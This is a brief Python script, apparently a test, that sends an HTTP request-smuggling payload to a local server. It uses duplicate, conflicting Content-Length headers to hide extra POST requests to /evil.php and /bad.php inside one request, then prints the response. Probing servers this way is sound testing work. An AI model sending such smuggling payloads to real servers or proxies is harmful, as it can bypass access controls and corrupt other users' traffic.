import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 8000))

dummyContent = "bar=1&foo=2"
badContent = "badbar=5&badfoo=6"
badReq = "POST /bad.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:{:d}\r\n\r\n{}".format(
    len(badContent), badContent)
evilContent = "evilbar=3&evilfoo=4"
evilReq = "POST /evil.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:{:d}\r\n\r\n{}".format(
    len(evilContent)+len(badReq), evilContent)

# This attempts request smuggling with different content-length values
a = sock.send("POST /which.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:{:d}\r\nContent-Length:{:d}\r\n\r\n{}{}{}".format(
    len(dummyContent), len(dummyContent)+len(evilReq), dummyContent, evilReq, badReq))
data = sock.recv(10000)
print("Received {}".format(data))

sock.close()
